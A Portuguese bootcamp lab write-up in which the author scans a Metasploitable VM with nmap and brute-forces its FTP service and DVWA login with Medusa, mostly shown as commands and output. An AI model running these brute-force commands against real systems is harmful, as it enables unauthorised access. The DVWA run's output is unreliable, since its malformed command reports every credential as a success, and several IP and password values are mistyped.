Projeto de testes de vulnerabilidades - Boot Camp Cibersecurity Santader

Prepação e instalação das maquinas Virtuais no Virtual Box.

Host Kali IP 192.168.56.102 - Placa de rede host only.

Host Metaesploitable IP 192.16.56.101  - Placa de rede Host only.


VERIFICANDO A COMUNICAÇÃO ENTRE OS HOSTS.


Comando ping -c 3 192.16.56.101 sem perda de pacotes.

Comando ping -c 3 192.16.56.102 sem perda de pacotes.



RECONHECIMENTO DAS PORTAS DOS SERVIÇOS RELACIONADOS AO FTP.



~$ nmap -sV -p 21,22,80,445,139 192.168.56.101

RESULTADO

Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 15:18 -03

Nmap scan report for 192.168.56.101

Host is up (0.0012s latency).



PORT STATE SERVICE VERSION



21/tcp open ftp vsftpd 2.3.4

22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)

80/tcp open http Apache httpd 2.2.8 ((Ubuntu) DAV/2)

139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

MAC Address: 08:00:27:FB:DE:18 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https:// nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 28.84 seconds



TESTE DE ACESSO AO FTP EXPOSTO



1 └─$ ftp 192.168.56.101

2 Connected to 192.168.56.101.

3 220 (vsFTPd 2.3.4)

4 Name (192.168.56.101:kaliadmin): 


CRIAÇÃO DO ARQUIVO DE SENHAS E PASSWORD


echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt


REALIZANDO TESTES DE BRUTE FORCE COM O MEDUSA


$ medusa -H 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6

Medusa V2.3 (http://www.foofus.net) (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

R & Remote system type is Unix.

2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 12356 (1 of 4 complete)

2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 12356 (1 of 4 complete)

2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (2 of 4 complete)

2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)

2025-11-30 17:17:59 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]

2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: password (2 of 4 complete)

2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: password (3 of 4 complete)

2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: qwerty (4 of 4 complete)

2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: 12356 (1 of 4 complete)

2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: qwerty (4 of 4 complete)

2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: password (2 of 4 complete)

2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: qwerty (3 of 4 complete)

2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)

2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: 12356 (1 of 4 complete)

2025-11-30 17:18:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (2 of 4 complete)

2025-11-30 17:18:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (3 of 4 complete)

2025-11-30 17:18:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)


VALIDANDO ACESSO AO FTP COM A CREDENCIAL VAZADA.


─$ ftp 192.168.56.101

Connected to 192.168.56.101.

220 (vsFTPd 2.3.4)

Name (192.168.56.101:kaliadmin): msfadmin

331 Please specify the password.

Password:

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

ftp>|

TESTES DE ACESSO A FOMULARIOS WEB POR BRUTE FORCE.

Realizado acesso ao portal 192.168.56.101/dvwa/login.php

Inserido um nome de usuário qualquer.

Acessado a ferramenta de modo de desenvolvedor para analise de POST e Request.

Verificado na requisição do post os valores

"username"

"password"

"login"

(kaliadmin@kaliteste:~)

$ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \

> -f "FORM: /dvwa/login.php" \

> -n "FORM:'username'=USER&'password'=PASS&'Login'=Login" \

> -r "FAIL-Login failed" -e n

Medusa V2.3 (http://www.foofus.net) (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

WARNING: Invalid method: PAGE.

WARNING: Invalid method: PAGE.

WARNING: Invalid method: FORM.

WARNING: Invalid method: FAIL-Login failed.

WARNING: Invalid method: PAGE.

WARNING: Invalid method: FORM.

WARNING: Invalid method: FAIL-Login failed.

WARNING: Invalid method: PAGE.

WARNING: Invalid method: FORM.

WARNING: Invalid method: FAIL-Login failed.

WARNING: Invalid method: PAGE.

WARNING: Invalid method: FORM.

WARNING: Invalid method: FAIL-Login failed.

WARNING: Invalid method: PAGE.

WARNING: Invalid method: FORM.

WARNING: Invalid method: FAIL-Login failed.

WARNING: Invalid method: PAGE.

WARNING: Invalid method: FORM.

WARNING: Invalid method: FAIL-Login failed.

2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (1 of 4 complete)

2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: msfadmin [SUCCESS]

2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: qwerty (1 of 4 complete)

2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: msfadmin Password: qwerty [SUCCESS]

2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 12356 (1 of 4 complete)

2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: 12356 [SUCCESS]

2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: password (2 of 4 complete)

2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: msfadmin Password: password [SUCCESS]

2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 5 complete) Password: 12356 (3 of 4 complete)

2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: msfadmin Password: 12356 [SUCCESS]

2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 6 complete) Password: 12356 (1 of 4 complete)

2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: root Password: 12356 [SUCCESS]

2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 7 complete) Password: password (2 of 4 complete)

2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: password [SUCCESS]

2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 8 complete) Password: qwerty (2 of 4 complete)

2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: root Password: qwerty [SUCCESS]

2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 9 complete) Password: 12356 (3 of 4 complete)

2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: 12356 [SUCCESS]

2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 10 complete) Password: password (3 of 4 complete)

2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: root Password: password [SUCCESS]

2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 11 complete) Password: qwerty (4 of 4 complete)

2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: qwerty [SUCCESS]


VALIDAÇÃO DO ACESSO AO FORMULÁRIO COM A CREDENCIAL ENCONTRADA

Após testes de brute force, o acesso ao formulario foi autenticado com sucesso.

O endereço 192.168.56.101/dvwa/index.php foi exibido.


